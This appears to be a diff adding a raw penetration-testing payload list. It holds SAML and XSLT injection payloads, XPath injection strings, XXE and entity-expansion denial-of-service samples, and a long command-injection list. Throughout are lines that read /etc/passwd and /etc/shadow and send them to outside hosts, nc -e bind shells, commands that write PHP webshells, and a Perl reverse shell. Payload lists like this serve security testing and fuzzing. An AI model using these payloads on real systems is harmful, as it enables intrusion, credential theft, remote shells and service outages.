@@ -1,0 +1,3962 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
+    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
+        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
+    </saml2p:Status>
+    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
+        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
+            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
+            </saml2:SubjectConfirmation>
+        </saml2:Subject>
+        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:AudienceRestriction>
+                <saml2:Audience>WLS_SP</saml2:Audience>
+            </saml2:AudienceRestriction>
+        </saml2:Conditions>
+        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+            <saml2:AuthnContext>
+                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
+            </saml2:AuthnContext>
+        </saml2:AuthnStatement>
+    </saml2:Assertion>
+</saml2p:Response>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Response [
+  <!ENTITY s "s">
+  <!ENTITY f1 "f1">
+]>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
+  ID="_04cfe67e596b7449d05755049ba9ec28"
+  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+[...]
+  <saml2:Attribute FriendlyName="uid"
+    Name="urn:oid:0.9.2342.19200300.100.1.1"
+    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+    <saml2:AttributeValue>
+      &s;taf&f1;
+    </saml2:AttributeValue>
+  </saml2:Attribute>
+[...]
+</saml2p:Response>
+
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+  ...
+    <ds:Transforms>
+      <ds:Transform>
+        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:template match="doc">
+            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
+            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
+            <xsl:value-of select="unparsed-text($exploitUrl)"/>
+          </xsl:template>
+        </xsl:stylesheet>
+      </ds:Transform>
+    </ds:Transforms>
+  ...
+</ds:Signature>
+string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+')] | //user/*[contains(*,'
+') and contains(../password,'c
+') and starts-with(../password,'c
+and string-length(account)=SIZE_INT
+substring(//user[userid=5]/username,2,1)=CHAR_HERE
+substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+*&rent_days=* and doc('//10.10.10.10/SHARE')
+<xsl:apply-templates select="//user[@id=1]"/>
+
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+ <xsl:value-of select="system-property('xsl:vendor')"/>
+  </xsl:template>
+</xsl:stylesheet>
+--------------
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<br />Version: <xsl:value-of select="system-property('xsl:version')" />
+<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+</body>
+</html>
+------------------------
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    Fruits &ext_file;:
+    <!-- Loop for each fruit -->
+    <xsl:for-each select="fruit">
+      <!-- Print name: description -->
+      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+------------------------------
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
+    <xsl:copy-of select="document('/etc/passwd')"/>
+    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
+    Fruits:
+     <!-- Loop for each fruit -->
+    <xsl:for-each select="fruit">
+      <!-- Print name: description -->
+      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+-----------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exploit="http://exslt.org/common" 
+  extension-element-prefixes="exploit"
+  version="1.0">
+  <xsl:template match="/">
+    <exploit:document href="evil.txt" method="text">
+      Hello World!
+    </exploit:document>
+  </xsl:template>
+</xsl:stylesheet>
+--------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body>
+<xsl:value-of select="php:function('readfile','index.php')" />
+</body>
+</html>
+-------------------------
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+  </xsl:template>
+</xsl:stylesheet>
+----------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+  <xsl:variable name="payload">
+    include("http://10.10.10.10/test.php")
+  </xsl:variable>
+  <xsl:variable name="include" select="php:function('assert',$payload)"/>
+</body>
+</html>
+-------------------------
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:variable name="eval">
+      eval(base64_decode('Base64-encoded Meterpreter code'))
+    </xsl:variable>
+    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+  </xsl:template>
+</xsl:stylesheet>
+-------------------------
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+  <xsl:template match="/">
+    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
+  </xsl:template>
+</xsl:stylesheet>
+--------------------------
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+    <xsl:template match="/">
+      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
+      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
+      <xsl:variable name="processString" select="ob:toString($process)"/>
+      <xsl:value-of select="$processString"/>
+    </xsl:template>
+  </xsl:stylesheet>
+-------------------------
+<xml version="1.0"?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
+<xsl:template match="/">
+<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
+</xsl:template>.
+</xsl:stylesheet>
+------------------
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
+    <msxsl:script implements-prefix="App" language="C#">
+      <![CDATA[
+        public string ToShortDateString(string date)
+          {
+              System.Diagnostics.Process.Start("cmd.exe");
+              return "01/01/2001";
+          }
+      ]]>
+    </msxsl:script>
+    <xsl:template match="ArrayOfTest">
+      <TABLE>
+        <xsl:for-each select="Test">
+          <TR>
+          <TD>
+            <xsl:value-of select="App:ToShortDateString(TestDate)" />
+          </TD>
+          </TR>
+        </xsl:for-each>
+      </TABLE>
+    </xsl:template>
+</xsl:stylesheet>
+------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="urn:my-scripts">
+
+<msxsl:script language = "C#" implements-prefix = "user">
+<![CDATA[
+public string execute(){
+System.Diagnostics.Process proc = new System.Diagnostics.Process();
+proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
+proc.StartInfo.RedirectStandardOutput = true;
+proc.StartInfo.UseShellExecute = false;
+proc.StartInfo.Arguments = "/c dir";
+proc.Start();
+proc.WaitForExit();
+return proc.StandardOutput.ReadToEnd();
+}
+]]>
+</msxsl:script>
+
+  <xsl:template match="/fruits">
+  --- BEGIN COMMAND OUTPUT ---
+ <xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT --- 
+  </xsl:template>
+</xsl:stylesheet>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+ <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+ <?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+  <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+  <!ENTITY % xxe PUBLIC "Random Text" "URL">
+<!ENTITY xxe PUBLIC "Any TEXT" "URL">
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
+]>
+<foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
+]>
+<foo>&xxe;</foo>
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+    a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  %pe_4;
+]>
+<r/>
+    <!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
+    %local_dtd;
+]>
+<root></root>
+/usr/share/xml/fontconfig/fonts.dtd
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+/usr/share/xml/svg/svg10.dtd
+/usr/share/xml/svg/svg11.dtd
+/usr/share/yelp/dtd/docbookx.dtd
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+    <!ENTITY % constant 'aaa)>
+            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
+            &#x25;eval;
+            &#x25;error;
+            <!ELEMENT aa (bb'>
+    %local_dtd;
+]>
+<message>Text</message>
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>anything</xxx>
+  <?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+    %ext;
+]>
+<message></message>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+"
+"'
+& 
+&& 
+'
+'"
+------------------
+; 
+?>
+`
+| 
+|| 
+$%26%26dir c:\
+$%26%26dir+c:%255c
+$%26%26dir+c:%2f
+$(cat /etc/passwd)
+$(`cat /etc/passwd`)
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`dir`)
+$+|+Dir+c:\
+$+|+Dir+c:%255c
+$+|+Dir+c:%2f
+$file = fopen ("phpinfo-1.php", "W"); echo fwrite ($file, "<?php phpinfo(); ?>"); fclose ($file)
+$file = fopen("pshell.php", "w"); echo fwrite($file, "php -r '$sock=fsockopen ('192.168.1.6' ,443) ;' /bin/sh -i <83 >83 2-83' ;"); fclose($file)
+$file = fopen ("testl.txt", "w"); echo fwrite($file, "Hello World. Testing!"); fclose($file)
+$file = fopen ("upload2.php", "w"); echo fwrite($file, '<html><form action="upload2.php" method="post" enctype="multipart/form-data">Select image to upload; <input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></html><?php if( isset ($_POST["submit"])){ $file_name = $_FILES["fileToUpload"] ["name"]; $file_tmp_name = $FILES["fIleToUpload"("tmpname"]; if (move uploaded_file($file_tmp_ name, " ./" . $file_name)) { echo "ok"; } } ?>'); fclose($file)
+;{$_GET["cmd"]}
+    $ip = $_GET['ip'];
+$(`ls`)
+ {${phpinfo()}}
+{${phpinfo()}}
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+{${sleep(10)}}
+ {${sleep(20)}}
+{${sleep(20)}}
+ {${sleep(3)}}
+{${sleep(3)}}
+ {${sleep(hexdec(dechex(20)))}} 
+{${sleep(hexdec(dechex(20)))}} 
+$(`type C:\boot.ini`)
+$;/usr/bin/id
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`whoami`)
+%0a
+%0a%0d
+%0Acat%20/etc/passwd
+%0A{cmd}
+%0A{cmd}%0A
+%0a+dir+c:\
+%0a+dir+c:%255c
+%0a+dir+c:%2f
+%0Aid
+%0a id %0a
+%0aid%0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0D{cmd}
+%0DCMD=$"{cmd}";$CMD
+%0DCMD=$'{cmd}';$CMD
+%0DCMD=$\'{cmd}\';$CMD
+%0D{cmd}%0D
+{1} + {1}
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+%22%0A/usr/bin/id%0A%22
+..%255c
+/..%255c..%255c
+%26%26+|+dir c:\
+%26%26+|+dir c:%255c
+%26%26+|+dir c:%2f
+%27%0A/usr/bin/id%0A%27
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+{{4+4}}
+{{4+8}}
+.%5c../..%5c
+a);{cmd}
+a);{cmd}|
+a;{cmd}
+a;{cmd};
+a);id
+a);id;
+a);id|
+a)|id
+a)|id;
+a;id
+a;id;
+a;id|
+a|id
+a|id|
+a;id\n
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a|/usr/bin/id
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+|/bin/ls -al
+/\b\i\n/////s\h
+/..%c0%9v../
+/..%c0%af../
+-c 10 127.0.0.1
+-c 10 google.com
+ca$@t /etc/passwd
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+cat /etc/hosts
+{cat,/etc/passwd}
+c"a"t /etc/passwd
+c'a't /etc/passwd
+c\a\t /etc/passwd
+cat /etc/passwd
+cd /etc > ls
+chdir
+chmod("index.html",0777);
+CHMOD("index.html",0777);
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+&&{cmd}
+&&{cmd}&&
+&{cmd}
+&{cmd}&
+'{cmd}'
+;{cmd}
+;{cmd};
+;{cmd}|
+<{cmd}
+<{cmd};
+^{cmd}
+`{cmd}`
+{cmd}
+|{cmd}
+|{cmd};
+&&CMD=$"{cmd}";$CMD
+&&CMD=$'{cmd}';$CMD
+&&CMD=$\'{cmd}\';$CMD
+&CMD=$"{cmd}";$CMD
+&CMD=$'{cmd}';$CMD
+&CMD=$\'{cmd}\';$CMD
+;CMD=$"{cmd}";$CMD
+;CMD=$'{cmd}';$CMD
+;CMD=$\'{cmd}\';$CMD
+^CMD=$"{cmd}";$CMD
+^CMD=$'{cmd}';$CMD
+^CMD=$\'{cmd}\';$CMD
+|CMD=$"{cmd}";$CMD
+|CMD=$'{cmd}';$CMD
+|CMD=$\'{cmd}\';$CMD
+CMD=$"{cmd}";$CMD
+CMD=$'{cmd}';$CMD
+CMD=$\'{cmd}\';$CMD
+<{cmd}%0A
+<{cmd}%0D
+;{cmd}/n
+<{cmd}\n
+/???/c?t /etc/passwd
+/???/c?t /?tc/?as?wd
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+& curl http://crowdshield.com/.testing/rce.txt
+| curl http://crowdshield.com/.testing/rce.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt
+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+& dir
+&& dir
+&&dir
+; dir
+| dir
+dir
++|+dir+c:\+|
++dir+c:\+|
+||+dir|c:\
+dir+c:\
+& dir C:\
+&& dir C:\
+; dir C:\
+| dir C:\
+dir C:\
++|+Dir+c:\
++|+Dir+c:%255c
++|+dir+c:%2f+|
++|+Dir+c:%2f
+& dir C:\Documents and Settings\*
+&& dir C:\Documents and Settings\*
+; dir C:\Documents and Settings\*
+| dir C:\Documents and Settings\*
+dir C:\Documents and Settings\*
+& dir C:\Users
+&& dir C:\Users
+; dir C:\Users
+| dir C:\Users
+dir C:\Users
+echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo%20copy("/etc/passwd","/tmp/passwd");
+echo%20file_exists("/etc/passwd");
+ECHO%20FILE_EXISTS("/etc/passwd");
+echo%20file_exists("index.html");
+ECHO%20FILE_EXISTS("index.html");
+echo%20file_exists("/tmp/passwd");
+echo%20file_get_contents("/etc/passwd");
+ECHO%20FILE_GET_CONTENTS("/etc/passwd");
+echo%20fileperms("/etc/passwd");
+ECHO%20FILEPERMS("/etc/passwd");
+echo%20fileperms("index.html");
+ECHO%20FILEPERMS("index.html");
+echo%20file_put_contents("index.html","Hello%20World.%20Testing!");
+ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");
+;echo%20'<script>alert(1)</script>'
+echo 'id'
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+;echo '<script>alert(1)</script>'
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+echo %USERNAME%
+& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
